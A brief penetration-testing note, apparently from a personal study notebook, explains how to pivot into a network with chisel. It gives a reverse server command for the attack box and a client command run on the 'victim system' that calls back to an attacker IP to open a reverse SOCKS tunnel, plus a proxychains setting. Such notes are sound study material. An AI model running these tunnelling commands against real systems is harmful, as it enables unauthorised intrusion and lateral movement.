When using chisel you can forward an entire system so you can scan/use tools you would otherwise not have at your disposal.

You can do this by creating a chisel server on your attack box as follows 

`chisel server -port 8000 --reverse`

Once this is done, you want to transfer chisel to the victim system. You can find methods in [[File Transfer]]

Set up the client as follows 
`chisel client <ATTACKER IP>:8000 R:socks`

**ENSURE YOUR `/etc/proxychains4.conf` has `socks5  127.0.0.1 1080` **

You can now use proxychains to interact with the IP addresses you would otherwise be unable to communicate with.